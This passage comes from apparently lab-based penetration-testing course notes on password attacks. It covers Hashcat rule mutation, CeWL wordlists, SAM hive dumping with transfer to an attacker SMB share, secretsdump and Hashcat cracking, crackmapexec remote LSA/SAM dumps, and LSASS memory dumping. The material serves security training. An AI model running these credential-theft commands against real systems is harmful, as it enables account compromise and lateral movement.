      <td>Uppercase all letters.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">c</code></td>
      <td>Capitalize the first letter and lowercase others.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">sXY</code></td>
      <td>Replace all instances of X with Y.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">$!</code></td>
      <td>Add the exclamation character at the end.</td>
    </tr>
  </tbody>
</table>

<p>Each rule is written on a new line which determines how the word should be mutated. If we write the functions shown above into a file and consider the aspects mentioned, this file can then look like this:</p>

<h4 id="hashcat-rule-file">Hashcat Rule File</h4>

<p>Password Mutations</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">cat </span>custom.rule
<span class="go">
:
c
so0
c so0
sa@
c sa@
c sa@ so0
</span><span class="gp">$</span><span class="o">!</span>
<span class="gp">$</span><span class="o">!</span> c
<span class="gp">$</span><span class="o">!</span> so0
<span class="gp">$</span><span class="o">!</span> sa@
<span class="gp">$</span><span class="o">!</span> c so0
<span class="gp">$</span><span class="o">!</span> c sa@
<span class="gp">$</span><span class="o">!</span> so0 sa@
<span class="gp">$</span><span class="o">!</span> c so0 sa@
</code></pre></div></div>

<p>Hashcat will apply the rules of <code class="language-plaintext highlighter-rouge">custom.rule</code> for each word in <code class="language-plaintext highlighter-rouge">password.list</code> and store the mutated version in our <code class="language-plaintext highlighter-rouge">mut_password.list</code> accordingly. Thus, one word will result in fifteen mutated words in this case.</p>

<p>Password Mutations</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>hashcat <span class="nt">--force</span> password.list <span class="nt">-r</span> custom.rule <span class="nt">--stdout</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> mut_password.list
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">cat </span>mut_password.list
<span class="go">
password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Hashcat</code> and <code class="language-plaintext highlighter-rouge">John</code> come with pre-built rule lists that we can use for our password generating and cracking purposes. One of the most used rules is <code class="language-plaintext highlighter-rouge">best64.rule</code>, which can often lead to good results. It is important to note that password cracking and the creation of custom wordlists is a guessing game in most cases. We can narrow this down and perform more targeted guessing if we have information about the password policy and take into account the company name, geographical region, industry, and other topics/words that users may select from to create their passwords. Exceptions are, of course, cases where passwords are leaked and found.</p>

<h4 id="hashcat-existing-rules">Hashcat Existing Rules</h4>

<p>Password Mutations</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">ls</span> /usr/share/hashcat/rules/
<span class="go">
best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
</span></code></pre></div></div>

<p>We can now use another tool called <a href="https://github.com/digininja/CeWL">CeWL</a> to scan potential words from the company’s website and save them in a separate list. We can then combine this list with the desired rules and create a customized password list that has a higher probability of guessing a correct password. We specify some parameters, like the depth to spider (<code class="language-plaintext highlighter-rouge">-d</code>), the minimum length of the word (<code class="language-plaintext highlighter-rouge">-m</code>), the storage of the found words in lowercase (<code class="language-plaintext highlighter-rouge">--lowercase</code>), as well as the file where we want to store the results (<code class="language-plaintext highlighter-rouge">-w</code>).</p>

<h6 id="generating-wordlists-using-cewl">Generating Wordlists Using CeWL</h6>

<p>Password Mutations</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>cewl https://www.inlanefreight.com <span class="nt">-d</span> 4 <span class="nt">-m</span> 6 <span class="nt">--lowercase</span> <span class="nt">-w</span> inlane.wordlist
<span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">wc</span> <span class="nt">-l</span> inlane.wordlist
<span class="go">
326
</span></code></pre></div></div>

<hr />

<h4 id="attacking-sam">Attacking SAM</h4>

<p>With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let’s walk through this process together using a target host. Feel free to follow along by spawning the target box in this section.</p>

<h6 id="copying-sam-registry-hives">Copying SAM Registry Hives</h6>

<p>There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:</p>

<table>
  <thead>
    <tr>
      <th>Registry Hive</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">hklm\sam</code></td>
      <td>Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">hklm\system</code></td>
      <td>Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">hklm\security</code></td>
      <td>Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.</td>
    </tr>
  </tbody>
</table>

<p>We can create backups of these hives using the <code class="language-plaintext highlighter-rouge">reg.exe</code> utility.</p>

<h6 id="using-regexe-save-to-copy-registry-hives">Using reg.exe save to Copy Registry Hives</h6>

<p>Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:</p>

<p>Attacking SAM</p>

<pre><code class="language-cmd-session">C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save

The operation completed successfully.
</code></pre>

<p>Technically we will only need <code class="language-plaintext highlighter-rouge">hklm\sam</code> &amp; <code class="language-plaintext highlighter-rouge">hklm\system</code>, but <code class="language-plaintext highlighter-rouge">hklm\security</code> can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. In this case, let’s use <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">Impacket’s smbserver.py</a> in combination with some useful CMD commands to move the hive copies to a share created on our attack host.</p>

<h6 id="creating-a-share-with-smbserverpy">Creating a Share with smbserver.py</h6>

<p>All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (<code class="language-plaintext highlighter-rouge">CompData</code>) and specify the directory on our attack host where the share will be storing the hive copies (<code class="language-plaintext highlighter-rouge">/home/ltnbob/Documents</code>). Know that the <code class="language-plaintext highlighter-rouge">smb2support</code> option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1">numerous severe vulnerabilites</a> and publicly available exploits.</p>

<p>Attacking SAM</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>python3 /usr/share/doc/python3-impacket/examples/smbserver.py <span class="nt">-smb2support</span> CompData /home/ltnbob/Documents/

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<p>Once we have the share running on our attack host, we can use the <code class="language-plaintext highlighter-rouge">move</code> command on the Windows target to move the hive copies to the share.</p>

<h6 id="moving-hive-copies-to-share">Moving Hive Copies to Share</h6>

<p>Attacking SAM</p>

<pre><code class="language-cmd">C:\&gt; move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\&gt; move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\&gt; move system.save \\10.10.15.16\CompData
        1 file(s) moved.
</code></pre>

<p>Then we can confirm that our hive copies successfully moved to the share by navigating to the shared directory on our attack host and using <code class="language-plaintext highlighter-rouge">ls</code> to list the files.</p>

<h4 id="confirming-hive-copies-transferred-to-attack-host">Confirming Hive Copies Transferred to Attack Host</h4>

<p>Attacking SAM</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span><span class="nb">ls</span>
<span class="go">
sam.save  security.save  system.save
</span></code></pre></div></div>

<h6 id="dumping-hashes-with-impackets-secretsdumppy">Dumping Hashes with Impacket’s secretsdump.py</h6>

<p>One incredibly useful tool we can use to dump the hashes offline is Impacket’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code>. Impacket can be found on most modern penetration testing distributions. We can check for it by using <code class="language-plaintext highlighter-rouge">locate</code> on a Linux-based system:</p>

<h6 id="locating-secretsdumppy">Locating secretsdump.py</h6>

<p>Attacking SAM</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>locate secretsdump 
</code></pre></div></div>

<p>Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.</p>

<h6 id="running-secretsdumppy">Running secretsdump.py</h6>

<p>Attacking SAM</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">c0derpwner@htb[/htb]$</span><span class="w"> </span>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <span class="nt">-sam</span> sam.save <span class="nt">-security</span> security.save <span class="nt">-system</span> system.save LOCAL
<span class="go">
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4d8c7cff8a543fbf245a363d2ffce518
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:3dd5a5ef0ed25b8d6add8b2805cce06b:::
defaultuser0:1000:aad3b435b51404eeaad3b435b51404ee:683b72db605d064397cf503802b51857:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
sam:1002:aad3b435b51404eeaad3b435b51404ee:6f8c3f4d3869a10f3b4f0522f537fd33:::
rocky:1003:aad3b435b51404eeaad3b435b51404ee:184ecdda8cf1dd238d438c4aea4d560d:::
ITlocal:1004:aad3b435b51404eeaad3b435b51404ee:f7eb9c06fafaa23c4bcf22ba6781c1e2:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb1e1744d2dc4403f9fb0420d84c3299ba28f0643
dpapi_userkey:0x7995f82c5de363cc012ca6094d381671506fd362
</span><span class="gp">[*] NL$</span>KM 
<span class="gp"> 0000   D7 0A F4 B9 1E 3E 77 34  94 8F C4 7D AC 8F 60 69   .....&gt;</span>w4...<span class="o">}</span>..<span class="sb">`</span>i
<span class="go"> 0010   52 E1 2B 74 FF B2 08 5F  59 FE 32 19 D6 A7 2C F8   R.+t..._Y.2...,.
 0020   E2 A4 80 E0 0F 3D F8 48  44 98 87 E1 C9 CD 4B 28   .....=.HD.....K(
 0030   9B 7B 8B BF 3D 59 DB 90  D8 C7 AB 62 93 30 6A 42   .{..=Y.....b.0jB
</span><span class="gp">NL$</span>KM:d70af4b91e3e7734948fc47dac8f606952e12b74ffb2085f59fe3219d6a72cf8e2a480e00f3df848449887e1c9cd4b289b7b8bbf3d59db90d8c7ab6293306a42
<span class="go">[*] Cleaning up... 
</span></code></pre></div></div>

<p>Here we see that secretsdump successfully dumps the <code class="language-plaintext highlighter-rouge">local</code> SAM hashes and would’ve also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the <code class="language-plaintext highlighter-rouge">system bootkey</code> before proceeding to dump the <code class="language-plaintext highlighter-rouge">LOCAL SAM hashes</code>. It cannot dump those hashes without the boot key because that boot key is used to encrypt &amp; decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:</p>

<p>Attacking SAM</p>

<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Dumping local SAM hashes (uid:rid:lmhash:nthash)
</span></code></pre></div></div>

<p>This tells us how to read the output and what hashes we can crack. Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista &amp; Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.</p>

<p>Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords. It may be beneficial to make a note of each user, so we know which password is associated with which user account.</p>

<hr />

<h4 id="cracking-hashes-with-hashcat">Cracking Hashes with Hashcat</h4>

<p>Once we have the hashes, we can start attempting to crack them using <a href="https://hashcat.net/hashcat/">Hashcat</a>. We will use it to attempt to crack the hashes we have gathered. If we take a glance at the Hashcat website, we will notice support for a wide array of hashing algorithms. In this module, we use Hashcat for specific use cases. This should help us develop the mindset &amp; understanding to use Hashcat as well as know when we need to reference Hashcat’s documentation to understand what mode and options we need to use depending on the hashes we capture.</p>

<p>As mentioned previously, we can populate a text file with the NT hashes we were able to dump.</p>

<h6 id="adding-nthashes-to-a-txt-file">Adding nthashes to a .txt File</h6>

<p>Attacking SAM</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
</code></pre></div></div>

<p>Now that the NT hashes are in our text file (<code class="language-plaintext highlighter-rouge">hashestocrack.txt</code>), we can use Hashcat to crack them.</p>

<h6 id="running-hashcat-against-nt-hashes">Running Hashcat against NT Hashes</h6>

<p>Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using <code class="language-plaintext highlighter-rouge">-m</code> to select the hash type <code class="language-plaintext highlighter-rouge">1000</code> to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat’s <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">wiki page</a> or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the <code class="language-plaintext highlighter-rouge">Credential Storage</code> section of this module.</p>

<p>Attacking SAM</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>hashcat <span class="nt">-m</span> 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

hashcat <span class="o">(</span>v6.1.1<span class="o">)</span> starting...

&lt;SNIP&gt;

Dictionary cache hit:
<span class="k">*</span> Filename..: /usr/share/wordlists/rockyou.txt
<span class="k">*</span> Passwords.: 14344385
<span class="k">*</span> Bytes.....: 139921507
<span class="k">*</span> Keyspace..: 14344385

f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon          
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme         
184ecdda8cf1dd238d438c4aea4d560d:adrian          
31d6cfe0d16ae931b73c59d7e0c089c0:                
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: dumpedhashes.txt
Time.Started.....: Tue Dec 14 14:16:56 2021 <span class="o">(</span>0 secs<span class="o">)</span>
Time.Estimated...: Tue Dec 14 14:16:56 2021 <span class="o">(</span>0 secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
Speed.#1.........:    14284 H/s <span class="o">(</span>0.63ms<span class="o">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 5/5 <span class="o">(</span>100.00%<span class="o">)</span> Digests
Progress.........: 8192/14344385 <span class="o">(</span>0.06%<span class="o">)</span>
Rejected.........: 0/8192 <span class="o">(</span>0.00%<span class="o">)</span>
Restore.Point....: 4096/14344385 <span class="o">(</span>0.03%<span class="o">)</span>
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: newzealand -&gt; whitetiger

Started: Tue Dec 14 14:16:50 2021
Stopped: Tue Dec 14 14:16:58 2021
</code></pre></div></div>

<p>We can see from the output that Hashcat used a type of attack called a <a href="https://en.wikipedia.org/wiki/Dictionary_attack">dictionary attack</a> to rapidly guess the passwords utilizing a list of known passwords (rockyou.txt) and was successful in cracking 3 of the hashes. Having the passwords could be useful to us in many ways. We could attempt to use the passwords we cracked to access other systems on the network. It is very common for people to re-use passwords across different work &amp; personal accounts. Knowing this technique, we covered can be useful on engagements. We will benefit from using this any time we come across a vulnerable Windows system and gain admin rights to dump the SAM database.</p>

<p>Keep in mind that this is a well-known technique, so admins may have safeguards to prevent and detect it. We can see some of these ways <a href="https://attack.mitre.org/techniques/T1003/002/">documented</a> within the MITRE attack framework.</p>

<h6 id="remote-dumping--lsa-secrets-considerations">Remote Dumping &amp; LSA Secrets Considerations</h6>

<p>With access to credentials with <code class="language-plaintext highlighter-rouge">local admin privileges</code>, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.</p>

<h4 id="dumping-lsa-secrets-remotely">Dumping LSA Secrets Remotely</h4>

<p>Attacking SAM</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>crackmapexec smb 10.129.42.198 <span class="nt">--local-auth</span> <span class="nt">-u</span> bob <span class="nt">-p</span> HTB_@cademy_stdnt! <span class="nt">--lsa</span>

SMB         10.129.42.198   445    WS01     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:FRONTDESK01<span class="o">)</span> <span class="o">(</span>domain:FRONTDESK01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.42.198   445    WS01     <span class="o">[</span>+] WS01<span class="se">\b</span>ob:HTB_@cademy_stdnt!<span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.42.198   445    WS01     <span class="o">[</span>+] Dumping LSA secrets
SMB         10.129.42.198   445    WS01     WS01<span class="se">\w</span>orker:Hello123
SMB         10.129.42.198   445    WS01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce
dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a
SMB         10.129.42.198   445    WS01     NL<span class="nv">$KM</span>:e4fe184b25468118bf23f5a32ae836976ba492b3a432deb3911746b8ec63c451a70c1826e9145aa2f3421b98ed0cbd9a0c1a1befacb376c590fa7b56ca1b488b
SMB         10.129.42.198   445    WS01     <span class="o">[</span>+] Dumped 3 LSA secrets to /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.secrets and /home/bob/.cme/logs/FRONTDESK01_10.129.42.198_2022-02-07_155623.cached
</code></pre></div></div>

<h6 id="dumping-sam-remotely">Dumping SAM Remotely</h6>

<p>We can also dump hashes from the SAM database remotely.</p>

<p>Attacking SAM</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>crackmapexec smb 10.129.42.198 <span class="nt">--local-auth</span> <span class="nt">-u</span> bob <span class="nt">-p</span> HTB_@cademy_stdnt! <span class="nt">--sam</span>

SMB         10.129.42.198   445    WS01      <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 18362 x64 <span class="o">(</span>name:FRONTDESK01<span class="o">)</span> <span class="o">(</span>domain:WS01<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.129.42.198   445    WS01      <span class="o">[</span>+] FRONTDESK01<span class="se">\b</span>ob:HTB_@cademy_stdnt! <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.42.198   445    WS01      <span class="o">[</span>+] Dumping SAM hashes
SMB         10.129.42.198   445    WS01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.42.198   445    WS01     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
SMB         10.129.42.198   445    WS01     bob:1001:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
SMB         10.129.42.198   445    WS01     sam:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.42.198   445    WS01     rocky:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
SMB         10.129.42.198   445    WS01     worker:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         10.129.42.198   445    WS01     <span class="o">[</span>+] Added 8 SAM hashes to the database
</code></pre></div></div>

<h3 id="attacking-lsass">Attacking LSASS</h3>

<p>In addition to getting copies of the SAM database to dump and crack hashes, we will also benefit from targeting LSASS. As discussed in the <code class="language-plaintext highlighter-rouge">Credential Storage</code> section of this module, LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/147/lsassexe_diagram.png" alt="Diagram of Windows authentication process showing interactions between WinLogon.exe, lsass.exe, authentication packages, NTLM, and Kerberos." /></p>

<p>Upon initial logon, LSASS will:</p>

<ul>
  <li>Cache credentials locally in memory</li>
  <li>Create <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a></li>
  <li>Enforce security policies</li>
  <li>Write to Windows <a href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security">security log</a></li>
</ul>

<p>Let’s cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.</p>

<hr />

<h2 id="dumping-lsass-process-memory">Dumping LSASS Process Memory</h2>

<p>Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let’s cover techniques that can be performed using tools already built-in to Windows.</p>

<h4 id="task-manager-method">Task Manager Method</h4>

<p>With access to an interactive graphical session with the target, we can use task manager to create a memory dump. This requires us to:</p>

<p><img src="https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png" alt="Task Manager showing Local Security Authority Process with right-click menu open, highlighting 'Create dump file' option, and lsass.DMP file in search results." /></p>

<p><code class="language-plaintext highlighter-rouge">Open Task Manager</code> &gt; <code class="language-plaintext highlighter-rouge">Select the Processes tab</code> &gt; <code class="language-plaintext highlighter-rouge">Find &amp; right click the Local Security Authority Process</code> &gt; <code class="language-plaintext highlighter-rouge">Select Create dump file</code></p>

<p>A file called <code class="language-plaintext highlighter-rouge">lsass.DMP</code> is created and saved in:</p>

<p>Attacking LSASS</p>

<pre><code class="language-cmd">C:\Users\loggedonusersdirectory\AppData\Local\Temp
</code></pre>

<p>This is the file we will transfer to our attack host. We can use the file transfer method discussed in the <code class="language-plaintext highlighter-rouge">Attacking SAM</code> section of this module to transfer the dump file to our attack host.</p>

<h5 id="rundll32exe--comsvcsdll-method">Rundll32.exe &amp; Comsvcs.dll Method</h5>

<p>The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32">rundll32.exe</a>. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.</p>

<p>Before issuing the command to create the dump file, we must determine what process ID (<code class="language-plaintext highlighter-rouge">PID</code>) is assigned to <code class="language-plaintext highlighter-rouge">lsass.exe</code>. This can be done from cmd or PowerShell:</p>

<h5 id="finding-lsass-pid-in-cmd">Finding LSASS PID in cmd</h5>

<p>From cmd, we can issue the command <code class="language-plaintext highlighter-rouge">tasklist /svc</code> and find lsass.exe and its process ID in the PID field.</p>

<p>Attacking LSASS</p>

<pre><code class="language-cmd">C:\Windows\system32&gt; tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
</code></pre>

<h6 id="finding-lsass-pid-in-powershell">Finding LSASS PID in PowerShell</h6>

<p>From PowerShell, we can issue the command <code class="language-plaintext highlighter-rouge">Get-Process lsass</code> and see the process ID in the <code class="language-plaintext highlighter-rouge">Id</code> field.</p>

<p>Attacking LSASS</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Process</span><span class="w"> </span><span class="nx">lsass</span><span class="w">

</span><span class="n">Handles</span><span class="w">  </span><span class="nx">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w">    </span><span class="nx">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w">      </span><span class="nx">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w">     </span><span class="nx">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w">     </span><span class="nx">Id</span><span class="w">  </span><span class="nx">SI</span><span class="w"> </span><span class="nx">ProcessName</span><span class="w">
</span><span class="o">-------</span><span class="w">  </span><span class="o">------</span><span class="w">    </span><span class="o">-----</span><span class="w">      </span><span class="o">-----</span><span class="w">     </span><span class="o">------</span><span class="w">     </span><span class="o">--</span><span class="w">  </span><span class="o">--</span><span class="w"> </span><span class="o">-----------</span><span class="w">
   </span><span class="mi">1260</span><span class="w">      </span><span class="mi">21</span><span class="w">     </span><span class="mi">4948</span><span class="w">      </span><span class="mi">15396</span><span class="w">       </span><span class="mf">2.56</span><span class="w">    </span><span class="mi">672</span><span class="w">   </span><span class="mi">0</span><span class="w"> </span><span class="n">lsass</span><span class="w">
</span></code></pre></div></div>

<p>Once we have the PID assigned to the LSASS process, we can create the dump file.</p>

<h6 id="creating-lsassdmp-using-powershell">Creating lsass.dmp using PowerShell</h6>

<p>With an elevated PowerShell session, we can issue the following command to create the dump file:</p>

<p>Attacking LSASS</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">rundll32</span><span class="w"> </span><span class="nx">C:\windows\system32\comsvcs.dll</span><span class="p">,</span><span class="w"> </span><span class="nx">MiniDump</span><span class="w"> </span><span class="nx">672</span><span class="w"> </span><span class="nx">C:\lsass.dmp</span><span class="w"> </span><span class="nx">full</span><span class="w">
</span></code></pre></div></div>

